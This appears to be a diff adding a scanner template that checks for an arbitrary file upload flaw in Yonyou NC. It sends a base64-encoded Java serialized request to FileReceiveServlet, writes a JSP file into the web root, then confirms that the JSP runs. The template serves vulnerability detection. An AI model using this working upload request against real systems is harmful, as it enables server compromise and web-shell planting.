@@ -1,0 +1,32 @@
+id: yonyou-nc-arbitrary-fileupload
+
+info:
+  name: Yonyou NC Arbitrary file upload
+  author: pa55w0rd
+  severity: high
+  verified: true
+  description: |
+    fofa: app="用友-NC"
+  tags: yonyou,nc,arbitrary,fileupload
+  created: 2025/03/13
+
+set:
+  r1: randomInt(10000, 20000)
+  r2: randomInt(1000000000, 2000000000)
+  r3: base64Decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACdAAJRklMRV9OQU1FdAAJ")
+  r4: base64Decode("LmpzcHQAEFRBUkdFVF9GSUxFX1BBVEh0ABAuL3dlYmFwcHMvbmNfd2VieA==")
+rules:
+  r0:
+    request:
+      method: POST
+      path: /servlet/FileReceiveServlet
+      headers:
+        Content-Type: multipart/form-data;
+      body: '{{r3}}{{r1}}{{r4}}<%out.print("{{r2}}");%>'
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /{{r1}}.jsp
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r2)))
+expression: r0() && r1()
